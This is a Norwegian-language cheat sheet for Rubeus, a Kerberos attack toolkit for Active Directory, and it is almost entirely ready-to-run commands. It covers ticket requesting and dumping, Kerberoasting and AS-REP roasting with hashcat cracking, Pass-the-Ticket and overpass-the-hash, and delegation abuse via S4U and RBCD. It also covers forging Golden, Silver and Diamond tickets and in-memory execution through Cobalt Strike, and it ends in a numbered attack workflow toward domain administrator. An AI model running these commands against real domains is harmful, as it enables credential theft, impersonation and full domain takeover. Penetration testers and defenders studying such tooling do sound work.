# 🎫 Rubeus – verktøykasse for misbruk av Kerberos

<!-- language-home-navigation -->
[🏠 Norsk startside](../../README.nb.md) • [🌐 Languages](../../README.md#-available-languages)

[🇹🇷 Türkçe Sürüm](README.tr.md) • [🇬🇷 Ελληνικά](README.el.md)

> **Begreper og forutsetninger:** TGT er en billett som brukes til å be om tjenestebilletter (TGS). Pass-the-Ticket gjenbruker en billett; Golden/Silver Ticket forfalsker billetter med kompromitterte nøkler. Enkelte operasjoner krever forhøyede rettigheter. Sertifikat-, krypterings- og billettalternativer avhenger av versjon, domeneinnstillinger og oppdateringer; eldre eksempelparametere er beholdt. [Rubeus-dokumentasjonen](https://github.com/GhostPack/Rubeus).
>
> **Presisering:** S4U2Self og S4U2Proxy er protokolltrinn, men kommentarene nedenfor viser ikke nødvendigvis isolerte trinn. Delegeringsrettigheter og målkonfigurasjon avgjør om en kjede er mulig. «Mer diskret» er ingen garanti. En LDAP-tjenestebillett gir ikke alene DCSync-rettigheter. [Microsoft: begrenset delegering](https://learn.microsoft.com/en-us/windows-server/security/kerberos/kerberos-constrained-delegation-overview), [replikeringsrettighet](https://learn.microsoft.com/en-us/windows/win32/adschema/r-ds-replication-get-changes-all).

```
  ██████╗ ██╗   ██╗██████╗ ███████╗██╗   ██╗███████╗
  ██╔══██╗██║   ██║██╔══██╗██╔════╝██║   ██║██╔════╝
  ██████╔╝██║   ██║██████╔╝█████╗  ██║   ██║███████╗
  ██╔══██╗██║   ██║██╔══██╗██╔══╝  ██║   ██║╚════██║
  ██║  ██║╚██████╔╝██████╔╝███████╗╚██████╔╝███████║
  ╚═╝  ╚═╝ ╚═════╝ ╚═════╝ ╚══════╝ ╚═════╝ ╚══════╝
           Samhandling med og misbruk av Kerberos
```

<p align="center">
  <img src="https://img.shields.io/badge/Rubeus-Kerberos-red?style=for-the-badge" alt="Rubeus">
  <img src="https://img.shields.io/badge/Active_Directory-blue?style=for-the-badge" alt="AD">
  <img src="https://img.shields.io/badge/C%23-green?style=for-the-badge" alt="C#">
</p>

---

## 📋 Innholdsfortegnelse

- [Hva er Rubeus](#-hva-er-rubeus)
- [Grunnleggende bruk](#-grunnleggende-bruk)
- [Billettoperasjoner](#-billettoperasjoner)
- [Kerberoasting](#-kerberoasting)
- [AS-REP Roasting](#-as-rep-roasting)
- [Billettangrep](#-billettangrep)
- [Angrep mot delegering](#-angrep-mot-delegering)
- [Golden og Silver Tickets](#-golden-og-silver-tickets)
- [Hurtigreferanse](#-hurtigreferanse)
- [Ressurser](#-ressurser)

---

## 🎯 Hva er Rubeus

**Rubeus** er en C#-verktøykasse for samhandling med og misbruk av Kerberos:

- 🎫 **Billettoperasjoner** – Be om, forny og beskriv billetter
- 🔓 **Kerberoasting** – Hent ut hasher fra tjenestebilletter
- 🔑 **AS-REP roasting** – Angrip brukere uten forhåndsautentisering
- 🎭 **Pass-the-Ticket** – Gjenbruk stjålne billetter
- ✨ **Golden/Silver Tickets** – Forfalsk billetter

---

## 🚀 Grunnleggende bruk

### Kjøre Rubeus

```powershell
# Direkte kjøring
.\Rubeus.exe <command> [options]

# Kjør i minnet (Cobalt Strike)
execute-assembly Rubeus.exe <command>

# Last inn via PowerShell
[System.Reflection.Assembly]::LoadFile("C:\path\Rubeus.exe")
```

---

<a id="-billettoperasjoner"></a>
## 🎟️ Billettoperasjoner

### Be om TGT

```powershell
# Med passord
.\Rubeus.exe asktgt /user:admin /password:P@ssw0rd /domain:domain.local

# Med NTLM-hash
.\Rubeus.exe asktgt /user:admin /rc4:NTLMHASH /domain:domain.local

# Med AES256-nøkkel
.\Rubeus.exe asktgt /user:admin /aes256:AESKEY /domain:domain.local

# Med sertifikat
.\Rubeus.exe asktgt /user:admin /certificate:cert.pfx /password:pfxpass

# Skriv til fil
.\Rubeus.exe asktgt /user:admin /password:P@ssw0rd /outfile:ticket.kirbi
```

### Be om TGS

```powershell
# Be om tjenestebillett
.\Rubeus.exe asktgs /ticket:base64ticket /service:cifs/server.domain.local

# Med TGT fra fil
.\Rubeus.exe asktgs /ticket:ticket.kirbi /service:http/server.domain.local
```

### List billetter

```powershell
# List den gjeldende brukerens billetter
.\Rubeus.exe triage

# List alle billetter (krever administrator)
.\Rubeus.exe triage /luid:0x3e7

# Detaljert uthenting av billetter
.\Rubeus.exe dump
```

### Pass-the-Ticket

```powershell
# Importer billett til gjeldende økt
.\Rubeus.exe ptt /ticket:base64ticket

# Importer fra fil
.\Rubeus.exe ptt /ticket:ticket.kirbi

# Opprett ny påloggingsøkt og importer
.\Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe /show
.\Rubeus.exe ptt /ticket:ticket.kirbi /luid:0x123456
```

### Beskriv billett

```powershell
# Vis billettdetaljer
.\Rubeus.exe describe /ticket:base64ticket

# Fra fil
.\Rubeus.exe describe /ticket:ticket.kirbi
```

---

## 🍖 Kerberoasting

### Grunnleggende Kerberoasting

```powershell
# Kerberoast alle SPN-er
.\Rubeus.exe kerberoast

# Skriv til fil (hashcat-format)
.\Rubeus.exe kerberoast /outfile:kerberoast.txt

# Velg en bestemt bruker
.\Rubeus.exe kerberoast /user:sqlservice

# Nedgradering til RC4 (etype 23)
.\Rubeus.exe kerberoast /rc4opsec
```

### Avansert Kerberoasting

```powershell
# Med bestemt TGT
.\Rubeus.exe kerberoast /ticket:base64tgt

# Bare statistikk (ingen billetter)
.\Rubeus.exe kerberoast /stats

# Velg en bestemt SPN
.\Rubeus.exe kerberoast /spn:MSSQLSvc/sql.domain.local

# AES-kryptering (mer diskret)
.\Rubeus.exe kerberoast /aes

# Filtrer etter bruker
.\Rubeus.exe kerberoast /user:svc_sql /nowrap
```

### Knekking av Kerberoast-hasher

```bash
# Hashcat (modus 13100)
hashcat -m 13100 kerberoast.txt wordlist.txt

# John
john --wordlist=rockyou.txt kerberoast.txt
```

---

## 🔓 AS-REP Roasting

### Grunnleggende AS-REP roasting

```powershell
# Finn og roast brukere uten forhåndsautentisering
.\Rubeus.exe asreproast

# Skriv til fil
.\Rubeus.exe asreproast /outfile:asrep.txt

# Velg en bestemt bruker
.\Rubeus.exe asreproast /user:targetuser

# Hashcat-format
.\Rubeus.exe asreproast /format:hashcat
```

### Knekking av AS-REP-hasher

```bash
# Hashcat (modus 18200)
hashcat -m 18200 asrep.txt wordlist.txt
```

---

## 🎭 Billettangrep

### Overpass-the-Hash (Pass-the-Key)

```powershell
# Hent TGT med hash, opprett ny økt
.\Rubeus.exe asktgt /user:admin /rc4:NTLMHASH /ptt

# Med AES-nøkkel
.\Rubeus.exe asktgt /user:admin /aes256:AESKEY /ptt

# Opprett prosess for en separat påloggingskontekst
.\Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe /show
.\Rubeus.exe asktgt /user:admin /rc4:HASH /ptt /luid:0x123456
```

### S4U (Service for User)

```powershell
# S4U2Self – opptre som bruker overfor egen tjeneste
.\Rubeus.exe s4u /user:serviceaccount /rc4:HASH /impersonateuser:admin /msdsspn:cifs/target.domain.local

# S4U2Proxy – opptre som bruker overfor en annen tjeneste
.\Rubeus.exe s4u /ticket:tgt.kirbi /impersonateuser:admin /msdsspn:cifs/dc.domain.local /altservice:ldap

# Hele kjeden
.\Rubeus.exe s4u /user:svc /rc4:HASH /impersonateuser:administrator /msdsspn:cifs/target.domain.local /ptt
```

---

## 🔀 Angrep mot delegering

### Ubegrenset delegering

```powershell
# Overvåk etter TGT-er på vert med ubegrenset delegering
.\Rubeus.exe monitor /interval:5 /nowrap

# Bestemt filter
.\Rubeus.exe monitor /targetuser:DC$ /interval:5

# Samle inn TGT-er
.\Rubeus.exe harvest /interval:30
```

### Begrenset delegering

```powershell
# Be om billett for tillatt tjeneste
.\Rubeus.exe s4u /user:svcaccount /rc4:HASH /impersonateuser:administrator /msdsspn:time/dc.domain.local /altservice:cifs /ptt
```

### Ressursbasert begrenset delegering

```powershell
# Etter at RBCD er konfigurert med PowerMad/PowerView
# Be om billett som angriperens maskin
.\Rubeus.exe s4u /user:attackermachine$ /rc4:MACHINEACCOUNTHASH /impersonateuser:administrator /msdsspn:cifs/target.domain.local /ptt
```

---

## ✨ Golden og Silver Tickets

### Golden Ticket

```powershell
# Opprett Golden Ticket (krever krbtgt-hash)
.\Rubeus.exe golden /user:fakeadmin /domain:domain.local /sid:S-1-5-21-... /krbtgt:KRBTGTHASH /ptt

# Angi grupper
.\Rubeus.exe golden /user:fakeadmin /domain:domain.local /sid:S-1-5-21-... /krbtgt:HASH /groups:512,513,519 /ptt

# Med AES-nøkkel
.\Rubeus.exe golden /user:fakeadmin /domain:domain.local /sid:S-1-5-21-... /aes256:AESKEY /ptt
```

### Silver Ticket

```powershell
# Opprett Silver Ticket (krever hash for tjenestekontoen)
.\Rubeus.exe silver /service:cifs/target.domain.local /user:fakeadmin /domain:domain.local /sid:S-1-5-21-... /rc4:SERVICEHASH /ptt

# LDAP-tjeneste (DCSync)
.\Rubeus.exe silver /service:ldap/dc.domain.local /user:fakeadmin /domain:domain.local /sid:S-1-5-21-... /rc4:DCHASH /ptt
```

### Diamond Ticket

```powershell
# Endret legitim TGT
.\Rubeus.exe diamond /user:admin /password:P@ssw0rd /enctype:aes /domain:domain.local /dc:dc.domain.local /ticketuser:administrator /ticketuserid:500 /groups:512 /ptt
```

---

## 📊 Hurtigreferanse

### Viktige kommandoer

| Kommando | Beskrivelse |
|---------|-------------|
| `asktgt` | Be om TGT |
| `asktgs` | Be om TGS |
| `kerberoast` | Hent ut hasher fra tjenestebilletter |
| `asreproast` | AS-REP roasting |
| `ptt` | Pass-the-Ticket |
| `s4u` | Service for User |
| `golden` | Forfalsk Golden Ticket |
| `silver` | Forfalsk Silver Ticket |
| `dump` | Hent ut alle billetter |
| `triage` | List billetter |

### Autentiseringsalternativer

| Alternativ | Beskrivelse |
|--------|-------------|
| `/user:` | Brukernavn |
| `/password:` | Passord |
| `/rc4:` | NTLM-hash |
| `/aes256:` | AES256-nøkkel |
| `/ticket:` | Base64-billett |

### Vanlige alternativer

| Alternativ | Beskrivelse |
|--------|-------------|
| `/ptt` | Pass-the-Ticket |
| `/outfile:` | Skriv til fil |
| `/nowrap` | Ikke bruk linjeskift i base64 |
| `/domain:` | Måldomene |
| `/dc:` | Domenekontroller |

### Angrepsarbeidsflyt

```powershell
# 1. Kerberoast
.\Rubeus.exe kerberoast /outfile:kerb.txt

# 2. Knekk hasher
hashcat -m 13100 kerb.txt rockyou.txt

# 3. Hent TGT med knekt passord
.\Rubeus.exe asktgt /user:svc /password:CrackedPass /ptt

# 4. Eller Overpass-the-Hash
.\Rubeus.exe asktgt /user:admin /rc4:HASH /ptt

# 5. Få tilgang til ressurser
dir \\server\share
```

---

## 📚 Ressurser

- [Rubeus GitHub](https://github.com/GhostPack/Rubeus)
- [HarmJ0y Blog](https://blog.harmj0y.net/)
- [SpecterOps](https://specterops.io/)

### Relaterte hurtigreferanser
- [BloodHound](../../BloodHound/translations/README.nb.md)
- [Impacket](../../Impacket/translations/README.nb.md)
- [Mimikatz](../../Mimikatz/translations/README.nb.md)

---

<p align="center">
  <b>🎫 Behersk Kerberos!</b><br>
  <i>Rubeus – billetten til domeneadministrator</i>
</p>
